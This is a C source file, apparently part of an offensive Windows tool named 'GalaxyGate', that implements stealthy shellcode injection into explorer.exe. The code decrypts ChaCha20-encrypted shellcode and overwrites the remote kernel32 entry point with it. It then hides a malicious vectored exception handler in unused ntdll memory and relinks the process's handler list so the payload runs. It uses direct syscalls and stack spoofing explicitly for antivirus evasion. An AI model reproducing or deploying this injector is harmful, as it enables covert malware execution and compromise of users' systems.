#include <stdio.h>
#include <stdint.h>
#include "syscalls.h"
#include <stdbool.h>
#include <wchar.h>
#include <wctype.h>
#include "VEHinj.h"
#include "shellcode.h"

// GalaxyGate 自研栈欺骗方案 Stack Spoof Solution
LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo);
NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);

// ChaCha20 解密 Decryption
void chacha20_decrypt(const unsigned char* encrypted, size_t len, const unsigned char* key, const unsigned char* nonce, unsigned char* decrypted);

// 杂项 utils
DWORD ConvertProcNameToPid(wchar_t* ProcName);
HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD HandleAttributes);
PVOID GetLocalKernel32EntryPoint();
BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize);
PVOID findLdrpVectorHandlerList(PVOID VEH);
BOOL EnableRemoteVEH(HANDLE hProcess);
PVOID FindZeroHoleInRemote(HANDLE hProcess, PVOID regionBase, SIZE_T regionSize, SIZE_T holeSize, SIZE_T alignment);
void PrintDbgA(char* message);
void PrintDbgW(wchar_t* message);
void ErrExit();

// 自定义C运行时函数 Customized CRT Functions
size_t SFstrlen(const char* s);
size_t SFwcslen(const wchar_t* s);
wchar_t* SFwcsstr(const wchar_t* haystack, const wchar_t* needle);
int SFstrcmp(const char* a, const char* b);
size_t __imp_wcslen(const wchar_t* s);
size_t strlen(const char* s);

FORCEINLINE VOID SFRtlInitUnicodeString( // 使用自定义wcslen的RtlInitUnicodeString宏 其余一致
	_Out_ PUNICODE_STRING DestinationString,
	_In_opt_z_ PCWSTR SourceString
)
{
	if (SourceString)
		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(SFwcslen(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
	else
		DestinationString->MaximumLength = DestinationString->Length = 0;
	DestinationString->Buffer = (PWCH)SourceString;
}

FORCEINLINE VOID SFRtlInitAnsiString( // 与上个函数同理
	_Out_ PANSI_STRING DestinationString,
	_In_opt_z_ PCSTR SourceString
)
{
	if (SourceString)
		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)SFstrlen(SourceString)) + sizeof(ANSI_NULL);
	else
		DestinationString->MaximumLength = DestinationString->Length = 0;

	DestinationString->Buffer = (PCHAR)SourceString;
}

void InjectorEntry() {
	PrintDbgW(L"[!] 处于调试模式 可能降低免杀效果! | Currently in DEBUG mode, AV evasion effectiveness may be affected!\n");
	NTSTATUS status;
	PVOID VEH = AddVectoredExceptionHandler(1, ExceptionHandler); // GalaxyGate VEH
	DWORD ProcessPid = ConvertProcNameToPid(L"plor"); // 即explorer
	if (ProcessPid == 0) {
		PrintDbgW(L"[-] 未找到目标进程 | Target process not found\n");
		ErrExit;
	}
	HANDLE hProcessLowPriv = 0;
	CLIENT_ID clientId = { (HANDLE)ProcessPid, 0 };
	OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
	SFNtOpenProcess(&hProcessLowPriv, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);
	HANDLE hProcess = ElevateHandle(hProcessLowPriv, PROCESS_ALL_ACCESS, OBJ_INHERIT);
	if (hProcess == 0) {
		PrintDbgW(L"[-] 目标进程句柄提权失败 | Failed to elevate target process handle\n");
		ErrExit;
	}
	else {
		PrintDbgW(L"[+] 目标进程句柄提权成功 | Successfully elevated target process handle\n");
	}

	unsigned char* shellcode = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(encrypted_shellcode));
	chacha20_decrypt(encrypted_shellcode, sizeof(encrypted_shellcode), key, nonce, shellcode);
	SIZE_T shellcodeSize = sizeof(encrypted_shellcode);
	PrintDbgW(L"[+] Shellcode解密完成 | Shellcode decryption completed\n");
	DWORD mrdataSize;
	PVOID mrdataVa;
	if (!GetNtdllSectionVa(".mrdata", &mrdataVa, &mrdataSize)) {
		PrintDbgW(L"[-] 获取NtDLL .mrdata段失败");
		ErrExit();
	}
	DWORD dataSize;
	PVOID dataVa;
	if (!GetNtdllSectionVa(".data", &dataVa, &dataSize)) {
		PrintDbgW(L"[-] 获取NtDLL .data段失败");
		ErrExit();
	}
	// 从本地获取VEH链表头地址 和远程进程相同 可以直接应用到远程进程
	PVOID LdrpVectoredHandlerList = findLdrpVectorHandlerList(VEH);
	if (LdrpVectoredHandlerList == NULL) {
		PrintDbgW(L"[-] 获取VEH链表头地址失败 | Failed to obtain VEH list head address\n");
		ErrExit;
	}

	if (!EnableRemoteVEH(hProcess)) {
		PrintDbgW(L"[-] 启用远程进程VEH失败 | Failed to enable remote process VEH\n");
		ErrExit;
	}
	else {
		PrintDbgW(L"[+] 启用远程进程VEH成功 | Successfully enabled remote process VEH\n");
	}

	// 写入Shellcode
	ULONG oldProtect = 0;
	LPVOID shellcodeAddress = GetLocalKernel32EntryPoint();
	PVOID protectBase = shellcodeAddress;
	SIZE_T protectSize = shellcodeSize;
	SFNtProtectVirtualMemory(hProcess, &protectBase, &protectSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	SIZE_T bytesWritten = 0;
	SFNtWriteVirtualMemory(hProcess, shellcodeAddress, shellcode, shellcodeSize, &bytesWritten);
	SFNtProtectVirtualMemory(hProcess, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
	if (bytesWritten == 0) {
		PrintDbgW(L"[-] 写入Shellcode失败 | Failed to write shellcode to remote process\n");
		ErrExit;
	}
	PrintDbgW(L"[+] Shellcode写入成功 | Successfully wrote shellcode to remote process\n");

	// 编码Shellcode指针
	PVOID encodedShellcodePointer = NULL;
	status = RtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);
	if (status != 0) { // 即!=NT_SUCCESS
		PrintDbgW(L"[-] 编码Shellcode指针失败 | Failed to encode shellcode pointer\n");
		ErrExit;
	}

	// 让注入的VEH指向Shellcode
	PVECTXCPT_CALLOUT_ENTRY maliciousHandler = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VECTXCPT_CALLOUT_ENTRY));
	maliciousHandler->VectoredHandler = encodedShellcodePointer;

	// 读取远程VEH链表头
	PLIST_ENTRY firstEntry = (PLIST_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LIST_ENTRY));
	SIZE_T bytesRead = 0;
	SFNtReadVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesRead);
	if (bytesRead == 0) {
		PrintDbgW(L"[-] 读取远程VEH链表头失败 | Failed to read remote VEH list head\n");
		ErrExit;
	}

	// 设置新结点的 Flink/Blink 指向链表头
	((PLIST_ENTRY)maliciousHandler)->Flink = firstEntry->Flink;
	((PLIST_ENTRY)maliciousHandler)->Blink = firstEntry->Blink;

	// 在ntdll .data段寻找空洞 写入VEH结点
	PVOID scanBase = dataVa;
	SIZE_T scanSize = dataSize;
	const char* scanName = ".data";
	SIZE_T calloutSize = sizeof(VECTXCPT_CALLOUT_ENTRY);
	SIZE_T holeAlignment = sizeof(void*);
	SIZE_T totalNeeded = calloutSize + sizeof(ULONGLONG);
	totalNeeded = (SIZE_T)ALIGN_UP(totalNeeded, holeAlignment);
	PVOID zeroHole = FindZeroHoleInRemote(hProcess, scanBase, scanSize, totalNeeded, holeAlignment);
	if (zeroHole == NULL) { // 若失败 在ntdll .mrdata段寻找空洞
		scanBase = mrdataVa;
		scanSize = mrdataSize;
		scanName = ".mrdata";
		zeroHole = FindZeroHoleInRemote(hProcess, scanBase, scanSize, totalNeeded, holeAlignment);
	}
	if (zeroHole != NULL) {
		ULONGLONG ref64 = 1;
		PVOID refAddress = (PVOID)ALIGN_UP(((ULONG_PTR)zeroHole + calloutSize), sizeof(ULONGLONG));
		bytesWritten = 0;
		SFNtWriteVirtualMemory(hProcess, refAddress, &ref64, sizeof(ULONGLONG), &bytesWritten);
		if (bytesWritten == 0) {
			PrintDbgW(L"[-] 写入引用标记失败 | Failed to write reference marker\n");
			ErrExit;
		} else {
			PrintDbgW(L"[+] 写入引用标记成功 | Successfully wrote reference marker\n");
		}

		// 更新本地结点的 reserved 指向 refAddress
		maliciousHandler->reserved = refAddress;

		// 写入结点本体
		bytesWritten = 0;
		SFNtWriteVirtualMemory(hProcess, zeroHole, maliciousHandler, calloutSize, &bytesWritten);
		if (bytesWritten == 0) {
			PrintDbgW(L"[-] 写入VEH结点失败 | Failed to write VEH node\n");
			ErrExit;
		} else {
			PrintDbgW(L"[+] 写入VEH结点成功 | Successfully wrote VEH node\n");
		}

		// 更改复制的VEH链表头为指向零洞中的结点（保持结点的 Flink/Blink 指向 ListHead）
		firstEntry->Blink = zeroHole;
		firstEntry->Flink = zeroHole;

		// 将更新后的VEH链表头写回对应的节
		PVOID protBase = (PVOID)((ULONG_PTR)LdrpVectoredHandlerList & ~(ULONG_PTR)0xFFF);
		SIZE_T protSize = (((ULONG_PTR)LdrpVectoredHandlerList + sizeof(LIST_ENTRY) + 0xFFF) & ~(ULONG_PTR)0xFFF) - (ULONG_PTR)protBase;
		ULONG oldProtPage = 0, tmpOld = 0;
		SFNtProtectVirtualMemory(hProcess, &protBase, &protSize, PAGE_READWRITE, &oldProtPage);
		bytesWritten = 0;
		SFNtWriteVirtualMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), &bytesWritten);
		if (bytesWritten == 0) {
			PrintDbgW(L"[-] 写入远程VEH链表头失败 | Failed to write remote VEH list head\n");
			ErrExit;
		} else {
			PrintDbgW(L"[+] 写入远程VEH链表头成功 | Successfully wrote remote VEH list head\n");
		}
		SFNtProtectVirtualMemory(hProcess, &protBase, &protSize, oldProtPage ? oldProtPage : PAGE_READONLY, &tmpOld);
	}
	else {
		PrintDbgW(L"[-] 未在ntdll找到合适的内存空洞 | No suitable memory hole found in ntdll sections\n");
		ErrExit;
	}
	PrintDbgW(L"[+] 注入完成 | Injection DONE");
	return;
}

